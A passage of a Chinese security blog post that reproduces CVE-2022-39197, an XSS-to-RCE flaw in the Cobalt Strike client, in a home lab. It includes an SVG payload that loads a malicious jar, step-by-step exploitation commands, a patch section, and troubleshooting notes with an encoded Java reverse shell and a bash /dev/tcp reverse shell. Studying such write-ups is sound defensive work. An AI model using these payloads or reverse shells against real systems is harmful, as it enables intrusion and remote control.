+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">xmlns:xlink</span> =<span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/java-archive&quot;</span> <span class="hljs-attr">xlink:href</span>= <span class="hljs-string">&quot;http://127.0.0.1:9898/EvilJar-mac-calc.jar&quot;</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></code></pre>
+<p>5）EvilJar-mac-calc.jar：弹出计算器，<u>本地漏洞成功实现代码执行</u></p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021830741.png" srcset="/img/loading.gif" alt="本地利用漏洞实现代码执行" style="zoom:50%;"></p>
+<h3 id="反制复现">3.2 反制复现</h3>
+<p>cs服务端：vps centos：1.xxx.172</p>
+<p>攻击者：mac，10.211.55.2</p>
+<p>受害者：虚拟机win，10.211.55.3</p>
+<p>实现结果：受害者运行马，攻击者mac上的客户端上线，同时mac被反制弹出计算器</p>
+<p>1.编辑恶意文件内容</p>
+<p>编辑EvilJar.java，更改第19行代码参数为rce命令例如弹出计算器</p>
+<p>目标为win时的命令：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303241524024.png" srcset="/img/loading.gif" alt="x" style="zoom:50%;"></p>
+<p>为mac的命令：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303282357968.png" srcset="/img/loading.gif" alt="image-20230328235735922" style="zoom: 33%;"></p>
+<p>2.java编译，生成jar文件：在右侧的Maven栏目中，在Lifecycle中点击package，运行maven构建</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303241602900.png" srcset="/img/loading.gif" alt="自定义jar包" style="zoom: 33%;"></p>
+<p>(这里使用eclipse进行编译的话：</p>
+<p>​ 菜单栏点击File -&gt; 选择Export导出 -&gt; 选择java文件夹 -&gt;
+选择底下的JAR file -&gt; next之后在新的界面选择项目Eviljar -&gt;
+browser浏览生成的位置 -&gt;
+finish即可生成jar文件。将其置于serve路径下)</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303281117552.png" srcset="/img/loading.gif" alt="image-20230328111753975"></p>
+<p>3.木马文件(exe)要和poc py文件置于同一路径下</p>
+<p>4.在server路径下启动web服务==》满足目标能访问</p>
+<pre><code class="hljs angelscript">python -m http.server --bind <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <span class="hljs-number">9898</span></code></pre>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303281118179.png" srcset="/img/loading.gif" alt="image-20230328111843140" style="zoom: 33%;"></p>
+<p>5.编辑在此文件夹下的evil.svg文件，将[attacker]替换为当前路径启用的web地址【虚拟机win上开启web服务，mac可以访问】（不同测试忘换图，这里图里href
+ip应该为win端ip10.211.55.3）</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303241612951.png" srcset="/img/loading.gif" alt="x"></p>
+<p>6.cs客户端生成网页马</p>
+<p>​ win伪装成受害者下载网页马beacon.exe</p>
+<p>7.win执行poc
+py文件，cs客户端看到马上线后查看用户进程时，自己界面被弹出计算器</p>
+<pre><code class="hljs angelscript">python cve<span class="hljs-number">-2022</span><span class="hljs-number">-39197.</span>py beacon.exe http:<span class="hljs-comment">//10.211.55.3:9898/evil.svg</span></code></pre>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303290005652.png" srcset="/img/loading.gif" alt="执行poc"></p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303281645298.png" srcset="/img/loading.gif" alt="目标上线" style="zoom: 25%;"></p>
+<p>这时cs客户端进程名已被污染</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303281646669.png" srcset="/img/loading.gif" alt="cs客户端进程名被污染" style="zoom: 25%;"></p>
+<p>​</p>
+<p>​
+<strong>当滚动进程列表进行查看当前会话所在进程名时即触发，请求攻击者web服务上的evil.svg文件，而evil.svg文件又继续加载请求恶意文件EvilJar-1.0-jar-with-dependencies.jar，成功执行命令，从而达到RCE</strong></p>
+<p>​ 反制者收到cs端请求：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303290008049.png" srcset="/img/loading.gif" alt="请求"></p>
+<p>​</p>
+<p>​ cs端被执行命令：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303290008935.png" srcset="/img/loading.gif" alt="被反制"></p>
+<p>⚠️：</p>
+<p>1.弹出计算器需等待一会</p>
+<p>2.下线是因为poc 文件里设置等待100s后就会终止</p>
+<p>3.马的名字必须与poc里的beacon.exe一样，否则rce失败【当然后续都改为别的名字也可行】</p>
+<p>改成任意名字都可以：（py文件里line27）</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303301338977.png" srcset="/img/loading.gif" alt="image-20230330133839485" style="zoom: 33%;"></p>
+<h3 id="进一步反制复现测试">3.3 进一步反制复现测试</h3>
+<p>mac本地开启cs服务端、客户端</p>
+<pre><code class="hljs angelscript">cd /Users/romanc9/software/cs/cobaltstrike4<span class="hljs-number">.3</span>
+sudo ./teamserver <span class="hljs-number">10.211</span><span class="hljs-number">.55</span><span class="hljs-number">.2</span> <span class="hljs-number">123456</span>
+./start.sh
+
+java -XX:ParallelGCThreads=<span class="hljs-number">4</span> -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M - javaagent:CSAgent.jar=<span class="hljs-number">3</span>a4425490f389aeec312bdd758ad2b99 -Duser.language=en -jar cobaltstrike.jar</code></pre>
+<p>【复现成功，前面失败可能：jar文件不是mac的弹计算器，而是win的】</p>
+<p>cs server+客户端：mac</p>
+<p>攻击机：mac：10.211.55.2</p>
+<p>受害者/反制者：虚拟机win10：10.211.55.6</p>
+<p>生成mac calc恶意jar</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190139739.png" srcset="/img/loading.gif" alt="image-20230419013934659"></p>
+<p>生成web后门</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304181049670.png" srcset="/img/loading.gif" alt="image-20230418104955614"></p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304181050120.png" srcset="/img/loading.gif" alt="image-20230418105008045" style="zoom:50%;"></p>
+<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.211</span>.<span class="hljs-number">55.2</span>:<span class="hljs-number">80</span>/beacon.exe</code></pre>
+<p>靶机win下载木马</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304181051006.png" srcset="/img/loading.gif" alt="image-20230418105111924"></p>
+<p>​
+经测试，因虚拟机win10和mac都是arm64系统，所以经mac编译的exe文件虚拟机win10可运行，那么可直接生成exe文件复制粘贴而无需网页马</p>
+<p>win执行exp</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304191055371.png" srcset="/img/loading.gif" alt="image-20230419011651757"></p>
+<p>mac cs客户端被反制</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190115930.png" srcset="/img/loading.gif" alt="image-20230419011537847"></p>
+<p>即使断开连接了还能弹出计算器</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190122144.png" srcset="/img/loading.gif" alt="image-20230419012208085"></p>
+<p>删除会话也是，只要停留在这个进程页面都会弹，但必须是鼠标滚动到出现恶意进程名才会弹，鼠标停留在正常进程名字不会弹</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190123022.png" srcset="/img/loading.gif" alt="image-20230419012332945"></p>
+<p>同时反制者也能观察到记录，但都没有访问jar的记录</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190128491.png" srcset="/img/loading.gif" alt="访问记录" style="zoom:50%;"></p>
+<p>这时修改恶意jar包/删除/移动还是能弹，怀疑cs本地存在缓存/在加载恶意名的时候即下载恶意jar到本地了</p>
+<p>把http服务关闭后就不会再弹了，显示502网关错误</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190137207.png" srcset="/img/loading.gif" alt="报错"></p>
+<h2 id="漏洞防御补丁">4.漏洞防御&amp;补丁</h2>
+<p>防御办法：升级版本/打补丁</p>
+<p><strong>--更新版本：</strong></p>
+<p>​
+4.7.1版本已将新属性添加到TeamServer.prop文件（位于TeamServer的主文件夹中）：imits.beacons_xssvalidated指定是否对选定的beacon元数据执行XSS验证。默认情况下设置为true</p>
+<p><strong>--官方补丁</strong>：https://github.com/burpheart/CVE-2022-39197-patch</p>
+<p>​ 补丁原理：<u>通过在Cobalt
+Strike客户端启动时修改javax.swing.plaf.basic.BasicHTML类的isHTMLString方法，以禁用Swing框架的HTML支持功能</u></p>
+<p>补丁使用方法</p>
+<p>​ (1)下载patch.jar包，将patch.jar放入Cobalt
+Strike启动目录下，即与cobaltstrike.jar同一目录。</p>
+<p>​ (2)在Cobalt Strike客户端启动参数中加入javaagent 启用补丁</p>
+<pre><code class="hljs css"><span class="hljs-selector-tag">-javaagent</span><span class="hljs-selector-pseudo">:patch.jar</span></code></pre>
+<p>​ (3)启动Cobalt Strike输出Successfully Patched.
+即为补丁启用成功。<strong>经测试，如果只有服务端启动补丁，Cobalt
+Strike客户端不启动补丁，还是存在漏洞。</strong></p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021850336.png" srcset="/img/loading.gif" alt="客户端不打补丁的漏洞利用" style="zoom:50%;"></p>
+<p>​ (4)当Cobalt
+Strike客户端启动补丁，漏洞则不会触发，HTML代码会直接输出出来作为纯文本</p>
+<p>​ 客户端加上补丁启动：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021851817.png" srcset="/img/loading.gif" alt="客户端加上补丁启动" style="zoom:50%;"></p>
+<p>​ 客户端文字输出HTML：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021851138.png" srcset="/img/loading.gif" alt="客户端文字输出HTML" style="zoom:50%;"></p>
+<h2 id="思考问题">5.思考问题</h2>
+<p>分析该漏洞的时候，需明确几个节点</p>
+<p>1.Cobalt Strike漏洞与swing的关系</p>
+<p>2.漏洞是怎么从xss到rce的</p>
+<p>3.漏洞触发条件是攻击者查看用户进程吗，原理？</p>
+<p>4.代码攻击链怎么形成的</p>
+<h2 id="踩坑注意事项">6.踩坑/注意事项🚩</h2>
+<p>1.<em>mac m1 下生成的 shell , x86 运行上不了线</em>
+==&gt;网页马可以解决</p>
+<p><u>建议 cs 全套都在 x86 的机器上弄</u></p>
+<blockquote>
+<p>https://cn-sec.com/archives/1544546.html</p>
+</blockquote>
+<pre><code class="hljs stata">PS:
+<span class="hljs-keyword">mac</span>本机开启服务端、客户端，不管是http、https后门exe，虚拟<span class="hljs-keyword">win</span>都无法上线
+后门换成网页马，<span class="hljs-keyword">win</span>下载运行exe可以上线</code></pre>
+<p>cs网页马形式：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303301445459.png" srcset="/img/loading.gif" alt="网页马" style="zoom:50%;"></p>
+<p>但若都是arm机器：测试时可以直接鼠标拖拽运行上线</p>
+<p>2.报错：</p>
+<p>​
+frida与python版本报错：https://blog.csdn.net/song_lee/article/details/105102108【Building
+wheel for frida】</p>
+<p>​
+也就是要单独下载适配系统、python版本whl包安装即可：https://blog.csdn.net/weixin_34722995/article/details/70043392?fps=1&amp;locationNum=2、https://pypi.org/project/frida/16.0.2/#history</p>
+<pre><code class="hljs awk">使用如下命令查看，查看当前平台支持的版本【https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/t18438605018/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">121769227</span>】
+
+pip debug --verbose</code></pre>
+<p>3.如何关闭frida</p>
+<blockquote>
+<p>如果是在命令行模式下使用Frida，可以使用Ctrl+C组合键来终止正在运行的程序，并关闭Frida。
+如果是在Python脚本中使用Frida，可以使用<code>sys.exit()</code>命令来关闭Frida。
+如果正在使用Frida的GUI应用程序，可以在该应用程序中的“File”菜单中找到“Exit”选项来关闭Frida。
+无论使用哪种方法来关闭Frida，都应确保所有Frida进程和插件已经停止，并释放所有相关资源，确保系统安全和稳定。</p>
+</blockquote>
+<p>​</p>
+<p>4.在Python脚本中使用Frida，运行失败如何关闭frida</p>
+<blockquote>
+<p>如果在Python脚本中使用Frida运行失败，可以手动关闭Frida来结束它的运行，步骤如下：</p>
+<ol type="1">
+<li>打开终端或命令行窗口。</li>
+<li>输入"ps -ef | grep frida"命令，查找当前运行的Frida进程ID。</li>
+<li>输入"kill 接下来加上Frida进程ID"命令，强制结束Frida进程。
+如果使用的是Windows系统，则可以通过任务管理器来结束Frida进程。打开任务管理器，找到Frida进程，右键点击它，选择结束进程即可。</li>
+<li>注意，结束Frida进程会导致Frida脚本中的操作被取消，如果需要继续使用Frida，请检查原因并尝试修复问题。</li>
+</ol>
+</blockquote>
+<p><strong>经测试，若中途出现任务无法响应的情况，直接任务管理器结束任务即可，测试出现的frida报错导致无法启动frida的情况只能靠重启电脑实现，怀疑是缓存原因导致</strong></p>
+<p>5.除了基础测试漏洞的弹出计算器，还可进一步测试rce：</p>
+<blockquote>
+<p>反弹shell</p>
+<p>https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/</p>
+<p>https://xz.aliyun.com/t/5257</p>
+<p>https://www.cnpanda.net/codeaudit/759.html</p>
+</blockquote>
+<pre><code class="hljs angelscript">java命令:
+Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMy8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);
+
+bash命令：
+bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.3</span>/<span class="hljs-number">1234</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span></code></pre>
+<p>6.注意测试时Windows运行马时可以开启简单杀软避免defener误删</p>
+<blockquote>
+<p>https://github.com/Tlaster/YourAV</p>
+</blockquote>
+<p>7.运行poc
+py文件之前先安装依赖，由于我这遇到了问题就贴出来最后解决的命令</p>
+<pre><code class="hljs jboss-cli">pip install -r requirements.txt -i http:<span class="hljs-string">//pypi.douban.com/simple</span> <span class="hljs-params">--trusted-host</span> pypi.douban.com <span class="hljs-params">--no-cache-dir</span></code></pre>
+<h2 id="延伸参考">延伸参考</h2>
+<p>https://nvd.nist.gov/vuln/detail/CVE-2021-36798</p>
+<p>张慧琳,邹维,韩心慧.网页木马机理与防御技术[J].软件学报,2013,24(04):843-858.</p>
+<p>刘晨,李春强,丘国伟.基于Cobalt
+Strike和Office漏洞的入侵者反制研究[J].网络空间安全,2018,9(01):56-61.</p>
+<p>Strategic Cyber Cobalt Strike[J].SC magazine,2014,25(2):44-44</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/03/27/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0-Weblogic/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Weblogic未授权远程代码执行漏洞 (CVE-2023-21839)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/05/20/%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/">
+                        <span class="hidden-mobile">VulnHub-Raven: 2（udf webshell上传提权）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/Romanc9" target="_blank" rel="nofollow noopener"><span>Luoman</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
